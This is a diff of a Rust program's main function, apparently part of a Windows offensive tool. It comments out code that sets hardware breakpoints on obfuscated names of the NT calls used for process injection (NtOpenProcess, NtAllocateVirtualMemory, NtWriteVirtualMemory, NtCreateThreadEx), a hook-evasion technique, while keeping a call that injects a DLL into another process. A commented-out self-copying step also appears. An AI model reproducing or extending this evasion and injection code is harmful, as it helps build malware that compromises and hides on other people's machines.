@@ -81,28 +81,28 @@ fn main() {
     println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
 
 
-    let dr0 = hwbp::DR::Dr0;
-    let dr1 = hwbp::DR::Dr1;
-    let dr2 = hwbp::DR::Dr2;
-    let dr3 = hwbp::DR::Dr3;
+    // let dr0 = hwbp::DR::Dr0;
+    // let dr1 = hwbp::DR::Dr1;
+    // let dr2 = hwbp::DR::Dr2;
+    // let dr3 = hwbp::DR::Dr3;
 
-    unsafe {
-        let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");
-        let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
-        let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
-        let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
-        let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
-        let obfused_str_ntopenprocess = obfused_ntopenprocess.as_str();
-        let obfused_str_ntallocatevirtualmemory = obfused_ntallocatevirtualmemory.as_str();
-        let obfused_str_ntwritevirtualmemory = obfused_ntwritevirtualmemory.as_str();
-        let obfused_str_ntcreatethreadex = obfused_ntcreatethreadex.as_str();
+    // unsafe {
+    //     let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");
+    //     let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
+    //     let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
+    //     let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
+    //     let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
+    //     let obfused_str_ntopenprocess = obfused_ntopenprocess.as_str();
+    //     let obfused_str_ntallocatevirtualmemory = obfused_ntallocatevirtualmemory.as_str();
+    //     let obfused_str_ntwritevirtualmemory = obfused_ntwritevirtualmemory.as_str();
+    //     let obfused_str_ntcreatethreadex = obfused_ntcreatethreadex.as_str();
 
-        let _ = hwbp::set_hwbp(&dr0, obfused_str_ntopenprocess).expect("[ERROR] dr0");
-        let _ = hwbp::set_hwbp(&dr1, obfused_str_ntallocatevirtualmemory).expect("[ERROR] dr1");
-        let _ = hwbp::set_hwbp(&dr2, obfused_str_ntwritevirtualmemory).expect("[ERROR] dr2");
-        let _ = hwbp::set_hwbp(&dr3, obfused_str_ntcreatethreadex).expect("[ERROR] dr3");
+    //     let _ = hwbp::set_hwbp(&dr0, obfused_str_ntopenprocess).expect("[ERROR] dr0");
+    //     let _ = hwbp::set_hwbp(&dr1, obfused_str_ntallocatevirtualmemory).expect("[ERROR] dr1");
+    //     let _ = hwbp::set_hwbp(&dr2, obfused_str_ntwritevirtualmemory).expect("[ERROR] dr2");
+    //     let _ = hwbp::set_hwbp(&dr3, obfused_str_ntcreatethreadex).expect("[ERROR] dr3");
 
-    }
+    // }
 
 
     inject::inject_dll_into_process(
@@ -113,13 +113,13 @@ fn main() {
 
     // file::self_copying().expect("[ERROR] self copying failed!");
 
-    unsafe {
-        let _ = hwbp::unset_hwbp(&dr0);
-        let _ = hwbp::unset_hwbp(&dr1);
-        let _ = hwbp::unset_hwbp(&dr2);
-        let _ = hwbp::unset_hwbp(&dr3);
-        let _ = hwbp::hwbp_cleanup().expect("[ERROR] hwbp cleanup failed!");
-    }
+    // unsafe {
+    //     let _ = hwbp::unset_hwbp(&dr0);
+    //     let _ = hwbp::unset_hwbp(&dr1);
+    //     let _ = hwbp::unset_hwbp(&dr2);
+    //     let _ = hwbp::unset_hwbp(&dr3);
+    //     let _ = hwbp::hwbp_cleanup().expect("[ERROR] hwbp cleanup failed!");
+    // }
 
     for _i in 1..=3 {
         thread::sleep(Duration::from_secs(1));
